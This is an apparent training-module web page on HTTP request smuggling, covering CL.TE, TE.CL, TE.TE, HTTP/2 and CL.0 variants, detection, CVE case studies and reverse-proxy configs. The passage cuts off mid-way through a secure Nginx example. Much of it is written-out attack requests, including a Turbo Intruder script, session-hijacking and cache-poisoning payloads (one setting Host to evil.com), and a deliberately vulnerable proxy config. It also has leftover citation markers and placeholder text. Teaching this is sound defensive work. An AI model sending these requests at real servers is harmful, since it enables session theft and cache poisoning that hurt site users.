<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master HTTP Request Smuggling vulnerabilities - Understanding HRS attacks, CL.TE/TE.CL variants, and implementing robust defenses. Complete cybersecurity training module.">
  <title>HTTP Request Smuggling - Complete Guide | DarkHunter</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/http-smuggling-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#variants"><i>🧬</i> Attack Variants</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🔄</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">HTTP Request Smuggling (HRS)</h1>
        <p class="page-subtitle">
          Master HTTP Request Smuggling vulnerabilities - Learn how attackers exploit HTTP parsing inconsistencies
          between front-end and back-end servers to bypass security controls, hijack sessions, and compromise
          applications. Understand CL.TE, TE.CL, and modern HTTP/2 desynchronization attacks.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is HTTP Request Smuggling?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#variants">3. Attack Variants (CL.TE/TE.CL/TE.TE)</a></li>
            <li><a href="#exploitation">4. Exploitation Steps</a></li>
            <li><a href="#impact">5. Real-World Impact</a></li>
            <li><a href="#labs">6. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">7. Bypass Techniques</a></li>
            <li><a href="#mitigation">8. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is HTTP Request Smuggling?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> HTTP Request Smuggling (HRS) is a critical web security vulnerability that
          exploits inconsistencies in how different HTTP devices (front-end proxies, load balancers, and back-end
          servers) parse the boundaries of HTTP requests. By crafting ambiguous requests with conflicting Content-Length
          and Transfer-Encoding headers, attackers can "smuggle" hidden requests past security controls, leading to
          cache poisoning, session hijacking, and unauthorized access to protected resources.
        </div>

        <p class="text-content">
          HTTP Request Smuggling represents one of the most dangerous attack vectors in modern web architecture. It
          targets the fundamental way HTTP requests are processed in multi-tier architectures where requests pass
          through multiple intermediaries (CDNs, WAFs, load balancers) before reaching the origin server. Each component
          may interpret HTTP protocol specifications slightly differently, creating desynchronization that attackers can
          exploit to inject malicious requests into other users' sessions or bypass security filters entirely.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> Successful HRS attacks can lead to bypassing authentication and
          authorization controls, session hijacking and credential theft, web cache poisoning affecting all users,
          cross-site scripting (XSS) without user interaction, server-side request forgery (SSRF), and complete
          compromise of application security boundaries. The attack is particularly dangerous because it often requires
          no authentication and leaves minimal forensic traces.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>

        <div class="severity-badge severity-critical">
          CVSS Score: 9.9/10 (Critical) - CVE-2025-55315 [^14^]
        </div>

        <div class="highlight-box">
          <strong>CVSS Vector Breakdown:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector (AV):</strong> Network - Remotely exploitable without authentication</li>
            <li><strong>Attack Complexity (AC):</strong> Low - Well-documented techniques and tools available</li>
            <li><strong>Privileges Required (PR):</strong> None - No authentication needed</li>
            <li><strong>User Interaction (UI):</strong> None - Fully automated attack possible</li>
            <li><strong>Scope (S):</strong> Changed - Can affect other users and components beyond the vulnerable target
            </li>
            <li><strong>Impact:</strong> High on Confidentiality, Integrity, and Availability</li>
          </ul>
        </div>

        <p class="text-content">
          Recent vulnerabilities like CVE-2025-55315 in ASP.NET Core received Microsoft's highest-ever CVSS score of 9.9
          [^14^][^15^], while Google Cloud's Classic Application Load Balancer vulnerability (CVE-2025-4600)
          demonstrated that even major cloud infrastructure remains susceptible [^19^]. The severity reflects the
          potential for complete security feature bypass and the difficulty in detecting such attacks.
        </p>

        <div class="diagram-container">
          <div class="diagram-label">🏗️ HTTP Request Smuggling Architecture</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker → Front-end Proxy → Back-end Server showing request desynchronization and smuggled
            request injection]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How HTTP Request Smuggling Works</h2>

        <h3 class="subsection-title">The Core Problem: HTTP Message Boundaries</h3>
        <p class="text-content">
          HTTP/1.1 provides two different mechanisms for specifying where a request body ends: the
          <code>Content-Length</code> header (specifying exact byte count) and <code>Transfer-Encoding: chunked</code>
          (using chunked encoding with size prefixes). When both headers are present, RFC 2616 specifies that
          Transfer-Encoding should take precedence. However, not all implementations handle this consistently, creating
          the foundation for request smuggling attacks [^9^][^20^].
        </p>

        <div class="highlight-box">
          <strong>The Desynchronization Principle:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Attacker sends a request containing both Content-Length (CL) and Transfer-Encoding (TE) headers</li>
            <li>Front-end server (proxy/WAF) prioritizes one header to determine request length</li>
            <li>Back-end server prioritizes the other header, seeing a different request boundary</li>
            <li>The "gap" between these interpretations contains bytes that the back-end interprets as a new request
            </li>
            <li>This "smuggled" request can be prefixed to the next legitimate request</li>
          </ol>
        </div>

        <h3 class="subsection-title">HTTP Message Structure Analysis</h3>

        <div class="http-visual">
          <div class="http-line">
            <span class="http-header-name">POST / HTTP/1.1</span>
          </div>
          <div class="http-line">
            <span class="http-header-name">Host:</span>
            <span class="http-header-value">vulnerable-site.com</span>
          </div>
          <div class="http-line">
            <span class="http-header-name">Content-Length:</span>
            <span class="code-number">13</span>
          </div>
          <div class="http-line">
            <span class="http-header-name">Transfer-Encoding:</span>
            <span class="http-header-value">chunked</span>
          </div>
          <div class="http-body">
            <div style="color: var(--neon-green);">0</div>
            <div style="color: var(--danger); font-weight: bold;">SMUGGLED</div>
          </div>
        </div>

        <p class="text-content">
          In the example above, if the front-end uses Content-Length (13 bytes), it sees "0\r\nSMUGGLED" as the body. If
          the back-end uses Transfer-Encoding, it sees chunk size 0 (end of request) followed by "SMUGGLED" as the start
          of a new request [^9^][^20^].
        </p>

        <h3 class="subsection-title">The Three Main Attack Variants</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Variant</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Front-end Behavior</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-red);">Back-end Behavior</th>
              <th style="padding: 0.75rem; text-align: left;">Attack Vector</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;"><span class="variant-tag">CL.TE</span></td>
              <td style="padding: 0.75rem;">Uses Content-Length</td>
              <td style="padding: 0.75rem;">Uses Transfer-Encoding</td>
              <td style="padding: 0.75rem;">Short CL, TE sees continuation</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;"><span class="variant-tag">TE.CL</span></td>
              <td style="padding: 0.75rem;">Uses Transfer-Encoding</td>
              <td style="padding: 0.75rem;">Uses Content-Length</td>
              <td style="padding: 0.75rem;">Chunked prefix, CL ignores remainder</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;"><span class="variant-tag">TE.TE</span></td>
              <td style="padding: 0.75rem;">Uses TE (obfuscated)</td>
              <td style="padding: 0.75rem;">Ignores TE (obfuscated)</td>
              <td style="padding: 0.75rem;">Header obfuscation tricks</td>
            </tr>
          </table>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🎭</div>
            <div class="flow-label">Craft Ambiguous Request</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Both CL and TE headers present
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">🚪</div>
            <div class="flow-label">Front-end Parses</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Uses one header, forwards
              remainder</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">🎯</div>
            <div class="flow-label">Back-end Misinterprets</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Sees smuggled request</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">💀</div>
            <div class="flow-label">Execute Attack</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Session hijacking, cache
              poisoning</p>
          </div>
        </div>
      </div>

      <div id="variants" class="content-card">
        <h2 class="card-title"><i>🧬</i> Attack Variants in Detail</h2>

        <h3 class="subsection-title"><span class="variant-tag">CL.TE</span> Content-Length / Transfer-Encoding</h3>
        <p class="text-content">
          In CL.TE attacks, the front-end server prioritizes the Content-Length header while the back-end prioritizes
          Transfer-Encoding. The attacker crafts a request with a Content-Length that covers only part of the payload,
          while the Transfer-Encoding header causes the back-end to see additional content as a new request [^9^][^20^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">CL.TE Attack Payload</span></div>
          <pre><code><span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">vulnerable-website.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">13</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-string">SMUGGLED-REQUEST</span></code></pre>
        </div>

        <div class="warning-box">
          <strong>How it works:</strong> The front-end reads 13 bytes ("0\r\nSMUGGLED-REQ") and forwards everything. The
          back-end sees chunk size 0 (end of request), then "UEST" starts a new request. When the next legitimate
          request arrives, it becomes "UESTGET / HTTP/1.1..." causing a method confusion attack.
        </div>

        <h3 class="subsection-title"><span class="variant-tag">TE.CL</span> Transfer-Encoding / Content-Length</h3>
        <p class="text-content">
          TE.CL is the reverse: the front-end uses Transfer-Encoding while the back-end uses Content-Length. This is
          often harder to exploit because the front-end correctly processes chunked encoding, but the back-end ignores
          it in favor of Content-Length [^9^][^16^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">TE.CL Attack Payload</span></div>
          <pre><code><span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">vulnerable-website.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">3</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">15</span>
<span class="code-string">SMUGGLED-REQUEST-HERE</span>
<span class="code-number">0</span>

</code></pre>
        </div>

        <div class="warning-box">
          <strong>Critical Note:</strong> When sending TE.CL attacks via Burp Repeater, you must uncheck "Update
          Content-Length" to prevent Burp from automatically correcting the header. Also include the trailing \r\n\r\n
          after the final 0 [^9^][^16^].
        </div>

        <h3 class="subsection-title"><span class="variant-tag">TE.TE</span> Header Obfuscation</h3>
        <p class="text-content">
          In TE.TE attacks, both servers support Transfer-Encoding, but one can be tricked into ignoring it through
          header obfuscation. This effectively converts the vulnerability into either CL.TE or TE.CL depending on which
          server is fooled [^9^][^20^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">TE.TE Obfuscation Techniques</span></div>
          <pre><code><span class="code-comment">-- Method 1: Invalid chunk extension</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">xchunked</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-comment">-- Method 2: Space before colon</span>
<span class="code-attr">Transfer-Encoding :</span> <span class="code-string">chunked</span>

<span class="code-comment">-- Method 3: Tab character</span>
<span class="code-attr">Transfer-Encoding:</span><span class="code-string">[tab]chunked</span>

<span class="code-comment">-- Method 4: Line folding (deprecated but supported)</span>
<span class="code-attr">Transfer-Encoding:</span>
 <span class="code-string">chunked</span>

<span class="code-comment">-- Method 5: Multiple values with one invalid</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">x</span></code></pre>
        </div>

        <h3 class="subsection-title">Modern Variants: HTTP/2 Desynchronization</h3>
        <p class="text-content">
          With HTTP/2 adoption, new desynchronization attacks have emerged. HTTP/2 uses binary framing with explicit
          lengths, but when downgraded to HTTP/1.1 (H2.TE) or when implementations mishandle the conversion, smuggling
          opportunities arise [^4^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">H2.TE Attack (HTTP/2 to HTTP/1)</span></div>
          <pre><code><span class="code-comment">-- HTTP/2 request with injected TE header</span>
<span class="code-keyword">:method:</span> <span class="code-string">POST</span>
<span class="code-keyword">:path:</span> <span class="code-string">/</span>
<span class="code-keyword">:authority:</span> <span class="code-string">example.com</span>
<span class="code-attr">transfer-encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-string">x</span>

<span class="code-comment">-- If frontend fails to remove TE during downgrade,</span>
<span class="code-comment">-- backend sees chunked encoding and "x" prefixes next request</span></code></pre>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">CL.0 Attack (Content-Length Ignored)</span></div>
          <pre><code><span class="code-keyword">POST</span> <span class="code-string">/static/image.png HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">example.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">35</span>
<span class="code-attr">Connection:</span> <span class="code-string">keep-alive</span>

<span class="code-keyword">GET</span> <span class="code-string">/admin HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">example.com</span>

<span class="code-comment">-- Backend ignores CL on static resources, treats body as next request</span></code></pre>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting HRS</h2>

        <h3 class="subsection-title">Step 1: Detecting Desynchronization</h3>
        <p class="text-content">
          The first step is identifying whether a target architecture is vulnerable to request smuggling. This involves
          sending ambiguous requests and observing timing differences or error responses that indicate parsing
          inconsistencies [^9^][^25^].
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">CL.TE Detection Payload</span></div>
          <pre><code><span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">4</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">5</span>
<span class="code-string">X</span>
<span class="code-number">0</span>

<span class="code-comment">-- If timeout occurs: Backend likely vulnerable (waiting for 5 bytes)</span>
<span class="code-comment">-- If immediate response: Frontend may have rejected or used CL</span></code></pre>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">TE.CL Detection Payload</span></div>
          <pre><code><span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">6</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-string">X</span>
<span class="code-comment">-- Note: No trailing newline after X</span>

<span class="code-comment">-- If timeout: Backend waiting for more data (TE.CL confirmed)</span>
<span class="code-comment">-- If error: Possible vulnerability or strict parsing</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 2: Confirming the Vulnerability</h3>
        <p class="text-content">
          Once potential desynchronization is detected, confirm the vulnerability by attempting to influence the next
          request's processing. The classic confirmation is causing the server to return a "GPOST" method error [^22^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Confirmation Attack (CL.TE)</span></div>
          <pre><code><span class="code-comment">-- Request 1 (Smuggling):</span>
<span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">6</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-string">G</span>

<span class="code-comment">-- Request 2 (Normal):</span>
<span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>

<span class="code-comment">-- If vulnerable, backend sees: "GPOST / HTTP/1.1" -> Method not allowed</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Exploitation with Burp Suite</h3>
        <p class="text-content">
          Burp Suite provides specialized tools for request smuggling detection and exploitation. The HTTP Request
          Smuggler extension automates the detection process [^9^][^25^].
        </p>

        <div class="highlight-box">
          <strong>Burp Suite Configuration:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Install "HTTP Request Smuggler" from BApp Store</li>
            <li>For manual testing: Disable "Update Content-Length" in Repeater menu</li>
            <li>Switch to HTTP/1.1 if testing HTTP/2 endpoints (Inspector panel → Request attributes)</li>
            <li>Use Turbo Intruder for high-speed confirmation testing</li>
            <li>Enable "Allow HTTP/2 ALPN override" for H2.TE testing</li>
          </ol>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Turbo Intruder Script for Confirmation</span></div>
          <pre><code><span class="code-keyword">def</span> <span class="code-function">queueRequests</span>(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=<span class="code-keyword">False</span>)

    <span class="code-comment"># Smuggling payload</span>
    smuggle = <span class="code-string">'''POST / HTTP/1.1
Host: {host}
Content-Length: 6
Transfer-Encoding: chunked

0

G'''</span>

    <span class="code-comment"># Normal request</span>
    normal = <span class="code-string">'''POST / HTTP/1.1
Host: {host}

'''</span>

    <span class="code-comment"># Send smuggle followed immediately by normal</span>
    engine.queue(smuggle)
    engine.queue(normal)

<span class="code-keyword">def</span> <span class="code-function">handleResponse</span>(req, interesting):
    <span class="code-keyword">if</span> <span class="code-string">'GPOST'</span> <span class="code-keyword">in</span> req.response:
        table.add(req)</code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Advanced Exploitation Techniques</h3>

        <h4>Session Hijacking via Request Concatenation</h4>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Credential Hijacking Attack</span></div>
          <pre><code><span class="code-comment">-- Attacker sends:</span>
<span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">300</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-keyword">POST</span> <span class="code-string">/admin HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Type:</span> <span class="code-string">application/x-www-form-urlencoded</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">10</span>

<span class="code-string">x=</span>

<span class="code-comment">-- Victim sends next request on same connection:</span>
<span class="code-keyword">GET</span> <span class="code-string">/profile HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Cookie:</span> <span class="code-string">session=ABC123...</span>

<span class="code-comment">-- Backend sees smuggled request with victim's session cookie:</span>
<span class="code-keyword">POST</span> <span class="code-string">/admin HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>...
<span class="code-attr">Cookie:</span> <span class="code-string">session=ABC123...</span>  <span class="code-comment">-- Attacker now has victim's session!</span></code></pre>
        </div>

        <h4>Cache Poisoning Attack</h4>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Web Cache Poisoning via HRS</span></div>
          <pre><code><span class="code-comment">-- Poison the cache for /static/app.js:</span>
<span class="code-keyword">POST</span> <span class="code-string">/ HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">50</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-keyword">GET</span> <span class="code-string">/static/app.js HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">evil.com</span>

<span class="code-comment">-- Next request for /static/app.js gets poisoned response</span>
<span class="code-comment">-- All users receive attacker's malicious JavaScript</span></code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: HRS Exploitation Flow</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete exploitation chain from detection to session hijacking and cache poisoning]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious HRS Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Microsoft ASP.NET Core CVE-2025-55315 (2025)</h3>
        <p class="text-content">
          In October 2025, Microsoft patched CVE-2025-55315, an HTTP request smuggling vulnerability in ASP.NET Core's
          Kestrel web server, assigning it a CVSS score of 9.9—their highest ever [^14^][^15^][^21^]. The vulnerability
          allowed attackers to bypass security features by exploiting inconsistent interpretation of HTTP requests,
          specifically through invalid chunk extensions with malformed line endings.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> The vulnerability enabled privilege escalation (logging in as different users), SSRF
          attacks, CSRF bypass, and injection attacks. Microsoft emphasized that while the framework vulnerability
          itself was moderate, the impact on applications built atop it could be severe, justifying the critical score
          [^15^][^21^].
        </div>

        <h3 class="subsection-title">Case Study 2: Google Cloud Classic Load Balancer (2025)</h3>
        <p class="text-content">
          In April 2025, Google disclosed CVE-2025-4600, a request smuggling vulnerability in their Classic Application
          Load Balancer related to improper handling of chunked-encoded HTTP requests. The vulnerability allowed
          attackers to craft requests that could be misinterpreted by backend servers [^19^].
        </p>
        <div class="warning-box">
          <strong>Scope:</strong> Thousands of websites using Google's Load Balancer were potentially vulnerable.
          Researchers received an $8,500 bounty after Google confirmed the issue, which was fixed by disallowing stray
          data after a chunk [^19^][^25^].
        </div>

        <h3 class="subsection-title">Case Study 3: Gunicorn TE.CL Vulnerability CVE-2024-6827 (2024)</h3>
        <p class="text-content">
          Gunicorn version 21.2.0 was found vulnerable to TE.CL request smuggling due to improper validation of the
          Transfer-Encoding header. The server failed to validate the header according to RFC standards, falling back to
          Content-Length processing and creating a desynchronization vulnerability [^18^].
        </p>
        <div class="highlight-box">
          <strong>Consequences:</strong> The vulnerability could lead to cache poisoning, data exposure, session
          manipulation, SSRF, XSS, DoS attacks, data integrity compromise, security bypass, and information leakage
          [^18^].
        </div>

        <h3 class="subsection-title">Case Study 4: Django and Python Ecosystem (2025)</h3>
        <p class="text-content">
          Multiple vulnerabilities in 2024-2025 affected Python web frameworks. CVE-2025-26699 in Django and related
          issues in other frameworks demonstrated that even modern, security-conscious projects remain susceptible to
          HTTP parsing inconsistencies [^18^].
        </p>

        <h3 class="subsection-title">Attack Impact Matrix</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Attack Type</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Mechanism</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Business Impact</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Cache Poisoning</td>
              <td style="padding: 0.75rem;">Store malicious response in shared cache</td>
              <td style="padding: 0.75rem;">Mass XSS, malware distribution</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Session Hijacking</td>
              <td style="padding: 0.75rem;">Concatenate victim request to smuggled prefix</td>
              <td style="padding: 0.75rem;">Account takeover, data theft</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Bypass Controls</td>
              <td style="padding: 0.75rem;">Route around WAF/authentication</td>
              <td style="padding: 0.75rem;">Unauthorized admin access</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SSRF</td>
              <td style="padding: 0.75rem;">Force backend to make internal requests</td>
              <td style="padding: 0.75rem;">Internal network compromise</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Credential Theft</td>
              <td style="padding: 0.75rem;">Capture headers from victim requests</td>
              <td style="padding: 0.75rem;">Identity theft, lateral movement</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper HTTP parsing enables request smuggling, implement
          strict protocol validation, and configure secure reverse proxy architectures.
        </div>

        <h3 class="subsection-title">Lab 1: Vulnerable Reverse Proxy Configuration</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Nginx configuration that forwards ambiguous requests without normalizing
          headers.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable Nginx Configuration</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-comment"># /etc/nginx/sites-enabled/vulnerable-proxy</span>
<span class="code-keyword">server</span> {
    <span class="code-attr">listen</span> <span class="code-number">80</span>;
    <span class="code-attr">server_name</span> <span class="code-string">api.example.com</span>;

    <span class="code-attr">location</span> <span class="code-string">/</span> {
        <span class="code-comment"># DANGEROUS: Direct forwarding without header validation</span>
        <span class="code-attr">proxy_pass</span> <span class="code-string">http://backend:8080</span>;
        <span class="code-attr">proxy_set_header</span> <span class="code-string">Host</span> <span class="code-string">$host</span>;
        <span class="code-attr">proxy_set_header</span> <span class="code-string">X-Real-IP</span> <span class="code-string">$remote_addr</span>;
        
        <span class="code-comment"># VULNERABLE: No request body buffering or validation</span>
        <span class="code-attr">proxy_buffering</span> <span class="code-keyword">off</span>;
        <span class="code-attr">proxy_request_buffering</span> <span class="code-keyword">off</span>;
    }
}</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Nginx Configuration</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-comment"># /etc/nginx/sites-enabled/secure-proxy</span>
<span class="code-keyword">server</span> {
